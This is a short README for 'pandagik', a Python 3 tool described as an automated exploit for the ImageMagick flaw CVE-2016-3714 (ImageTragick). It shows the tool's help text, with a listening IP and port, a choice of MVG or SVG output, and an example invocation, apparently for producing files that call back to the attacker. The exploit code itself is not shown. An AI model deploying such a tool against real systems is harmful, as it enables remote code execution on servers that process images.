# pandagik
## Author: [Raphael Dray](https://www.linkedin.com/in/raphaeldray/)
Image Magick Exploit (CVE-2016-3714) automated in Python 3.

### Usage:
```bash
❯ python3 pandagik.py -h
usage: pandagik.py [-h] (--mvg | --svg) LHOST LPORT

ImageTragick Exploit

positional arguments:
  LHOST       Listening IP
  LPORT       Listening Port

options:
  -h, --help  show this help message and exit

File Type:
  --mvg       MVG File
  --svg       SVG File
```

You can either generate a MVG (`--mvg`) or a SVG (`--svg`):
```bash
python3 pandagik.py --mvg 192.168.13.37 1337
```
